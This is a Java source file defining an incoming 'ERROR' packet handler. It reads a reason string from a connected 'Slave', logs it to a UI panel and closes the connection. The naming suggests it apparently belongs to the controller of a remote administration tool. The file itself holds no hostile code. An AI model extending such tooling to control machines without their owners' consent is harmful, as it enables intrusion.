package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.ui.panels.PanelMainLog;

public class PacketERROR extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();
		
		PanelMainLog.instance.addEntry("Error", slave, reason);
		
		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
